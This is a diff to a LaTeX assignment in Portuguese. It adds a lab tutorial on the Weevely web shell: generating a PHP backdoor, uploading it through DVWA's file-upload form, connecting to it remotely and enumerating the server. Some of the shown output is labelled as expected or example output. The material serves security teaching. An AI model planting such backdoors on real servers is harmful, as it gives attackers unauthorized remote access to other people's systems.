@@ -468,10 +468,116 @@ Conteúdo de parágrafo
 
 Conteúdo de parágrafo
 \subsection{Q7}
-\subsubsection{Subsecção}
-\paragraph{}
 
-Conteúdo de parágrafo
+\paragraph{Proposta ---} enunciado na \textit{Questão 7}:
+
+\begin{quote}
+Use alguma outra ferramenta da Parrot e faça seu próprio experimento. Você pode pesquisar no livro ``Pentest em
+  Aplicações Web'' para entender como fazer algo. A escolha é sua. 
+  \item Demonstre com screenshots o experimento realizado;
+  \item Explique algum detalhe da saída obtida;
+  \item Organize o seu experimento na forma de um tutorial: faça uma descrição do experimento e da saída obtida. Esse
+    tutorial pode servir para outros alunos usarem a ferramenta. Entregue um arquivo .doc ou .odt com o texto dessa
+    questão;
+\end{quote}
+
+\subsubsection{Solução --- \textbf{Weevely}}
+
+\paragraph{}Neste experimento, utilizamos o \textbf{Weevely}, um web shell PHP leve projetado para administração remota de servidores e testes de penetração. Ele gera um arquivo PHP malicioso que pode ser carregado em um site vulnerável (neste caso, a DVWA - Damn Vulnerable Web Application), permitindo acesso remoto ao shell.
+
+\paragraph{Passo 1: Executar o Weevely}
+
+\begin{lstlisting}
+$ weevely
+\end{lstlisting}
+
+\textbf{Saída esperada:}
+
+\begin{lstlisting}
+weevely 4.5
+Usage: weevely generate <password> <output_file>
+       weevely <url> <password>
+\end{lstlisting}
+
+\paragraph{Passo 2: Gerar um Backdoor}
+
+\begin{lstlisting}
+$ weevely generate pass shell.php
+\end{lstlisting}
+
+\textbf{Exemplo de saída:}
+
+\begin{lstlisting}
+[*] Backdoor 'shell.php' generated successfully.
+[*] Password: pass
+\end{lstlisting}
+
+\paragraph{Passo 3: Upload do Backdoor}
+
+No navegador, acesse \texttt{http://[IP\_DA\_OWASP]/dvwa}, vá até a seção \textbf{Upload}, selecione \texttt{shell.php} e clique em \textbf{Upload}.
+
+\paragraph{Passo 4: Conectar ao Shell Remoto}
+
+\begin{lstlisting}
+$ weevely http://[IP_DA_OWASP]/dvwa/hackable/uploads/shell.php pass
+\end{lstlisting}
+
+\textbf{Saída esperada:}
+
+\begin{lstlisting}
+weevely 4.5 connected to http://[IP_DA_OWASP]/dvwa/hackable/uploads/shell.php
+weevely> 
+\end{lstlisting}
+
+\paragraph{Passo 5: Explorar o Servidor}
+
+Listar comandos disponíveis:
+
+\begin{lstlisting}
+weevely> :help
+Available commands:
+  :system_info   Show server system information
+  :ls            List files and directories
+  :cat           Display file contents
+  :upload        Upload a file
+  :download      Download a file
+\end{lstlisting}
+
+Obter informações do sistema:
+
+\begin{lstlisting}
+weevely> :system_info
+OS: Linux 5.15.0-80-generic
+Server IP: 10.0.2.5
+PHP Version: 7.4.33
+Document Root: /var/www/html
+\end{lstlisting}
+
+Listar diretórios do servidor:
+
+\begin{lstlisting}
+weevely> :ls
+drwxr-xr-x  2 www-data www-data 4096 Sep  1 12:00 uploads
+-rw-r--r--  1 www-data www-data  100 Sep  1 12:05 shell.php
+-rw-r--r--  1 www-data www-data 1024 Sep  1 11:00 index.php
+\end{lstlisting}
+
+\paragraph{Explicação da Saída}
+
+O comando \texttt{:system\_info} revela informações críticas do servidor:
+
+\begin{itemize}
+  \item Sistema operacional e versão (Linux 5.15.0-80-generic);
+  \item Endereço IP do servidor;
+  \item Versão do PHP em execução;
+  \item Diretório raiz da aplicação web.
+\end{itemize}
+
+Com estas informações, é possível identificar vulnerabilidades específicas das versões dos softwares em execução. Além disso, o acesso ao shell permite explorar diretórios, visualizar arquivos e, potencialmente, modificar ou subir arquivos maliciosos, aumentando o risco de escalonamento de privilégios no servidor.
+
+\paragraph{Conclusão}
+
+O Weevely demonstra como a funcionalidade de upload de arquivos em aplicações web vulneráveis pode ser explorada para obter acesso remoto ao servidor. Testes como este ajudam a entender a importância de validar e restringir uploads em aplicações PHP.
 
 \end{document}
 
